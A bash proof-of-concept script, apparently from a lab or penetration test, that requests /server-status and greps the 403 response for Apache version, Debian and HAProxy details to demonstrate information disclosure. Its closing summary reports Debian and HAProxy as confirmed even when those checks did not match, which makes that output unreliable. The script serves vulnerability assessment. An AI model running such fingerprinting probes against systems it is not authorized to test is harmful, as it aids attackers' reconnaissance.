#!/bin/bash

# POC: Information Disclosure via /server-status Endpoint
# This script demonstrates how backend infrastructure information is exposed
# in the HTTP 403 Forbidden response from the /server-status endpoint

TARGET_URL="${1:-http://localhost:32768}"
ENDPOINT="/server-status"

echo "=========================================="
echo "Information Disclosure POC: /server-status"
echo "=========================================="
echo ""
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo "[*] Testing for backend server information disclosure..."
echo ""

# Make request to /server-status endpoint
RESPONSE=$(curl -s -i "$TARGET_URL$ENDPOINT" 2>&1)

echo "[*] Full Response:"
echo "----------------------------------------"
echo "$RESPONSE"
echo "----------------------------------------"
echo ""

# Extract and analyze the response
if echo "$RESPONSE" | grep -q "403 Forbidden"; then
    echo "[+] HTTP 403 Forbidden response detected"
    echo ""
    
    # Extract server information from footer
    if echo "$RESPONSE" | grep -q "Apache"; then
        echo "[!] VULNERABILITY: Apache version exposed!"
        APACHE_VERSION=$(echo "$RESPONSE" | grep -oP 'Apache/[\d\.]+ \([^)]+\)' | head -1)
        echo "    └─ $APACHE_VERSION"
    fi
    
    if echo "$RESPONSE" | grep -q "Debian"; then
        echo "[!] VULNERABILITY: Debian OS exposed!"
        echo "    └─ Operating System: Debian"
    fi
    
    if echo "$RESPONSE" | grep -q "haproxy"; then
        echo "[!] VULNERABILITY: Reverse proxy architecture exposed!"
        PROXY_INFO=$(echo "$RESPONSE" | grep -oP 'Server at \S+ Port \d+' | head -1)
        echo "    └─ $PROXY_INFO"
    fi
    
    echo ""
    echo "[+] Information Disclosure Confirmed:"
    echo "    - Backend server version: $APACHE_VERSION"
    echo "    - Operating System: Debian"
    echo "    - Reverse Proxy: HAProxy"
    echo "    - Risk: Attackers can identify known vulnerabilities in these versions"
    echo ""
    
else
    echo "[-] Unexpected response code. Response:"
    echo "$RESPONSE"
    exit 1
fi

echo "[*] POC Complete - Information disclosure vulnerability confirmed"